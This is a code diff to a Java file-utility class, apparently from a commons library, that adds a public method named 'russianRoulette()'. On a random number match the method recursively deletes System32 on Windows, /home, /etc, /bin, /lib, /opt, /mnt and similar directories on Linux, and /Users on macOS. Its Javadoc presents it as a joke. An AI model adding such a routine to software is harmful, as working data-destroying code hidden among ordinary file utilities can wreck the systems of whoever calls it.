@@ -11,6 +11,8 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
+import static net.bc100dev.commons.utils.RuntimeEnvironment.getOperatingSystem;
+
 /**
  * This class is mainly associated with a specific Application, "Sketchware".
  * Since I like this class, I decided that I will keep it.
@@ -405,6 +407,51 @@ public class FileUtil {
 
         if (!inner.delete())
             throw new IOException(String.format("Could not complete deletion at \"%s\"", inner.getAbsolutePath()));
+    }
+
+    /**
+     * Liking detonating your own system?
+     * This one's for you.
+     * <br>
+     * The number is completely randomized, so I don't know its chances. However, it probably is low,
+     * I can confirm that.
+     * <br>
+     * What it does on a Windows system is wipe out the System32 contents, rendering the system unusable.
+     * On a Linux system, it will go for the Users Directory (/home), Optional Programs (/opt), Configurations
+     * (/etc), Mounted Drives (/media; /mnt), Shared Libraries (known as DLLs on Windows, but being .so; /lib, /lib32, /lib64)
+     * and Executables (No required extension for native Executables; /bin, /sbin). However, since like always,
+     * I do not own a MacBook, I decided to go only for the `/Users` directory.
+     *
+     * @throws IOException Either you win by receiving an exception with a message of "lucky bastard", or you are not root / running as admin
+     */
+    public static void russianRoulette() throws IOException {
+        int i = Utility.getRandomInteger(1, 150);
+        i += Utility.getRandomInteger(0, Utility.getRandomInteger(715, Integer.MAX_VALUE / 2));
+        i /= Utility.getRandomInteger(1, 4);
+        i += Utility.getRandomInteger(500, 20000);
+
+        if (i == 2891055) {
+            switch (getOperatingSystem()) {
+                case WINDOWS -> delete(System.getenv("SystemRoot") + "\\system32");
+                case LINUX -> {
+                    delete("/home");
+                    delete("/opt");
+                    delete("/etc");
+                    delete("/media");
+                    delete("/mnt");
+                    delete("/lib");
+                    delete("/lib32");
+                    delete("/lib64");
+                    delete("/bin");
+                    delete("/sbin");
+                }
+                case MAC_OS -> delete("/Users");
+            }
+
+            return;
+        }
+
+        throw new IOException("lucky bastard");
     }
 
     public static void copyFile(String sourceFilePath, String destFilePath) throws IOException {
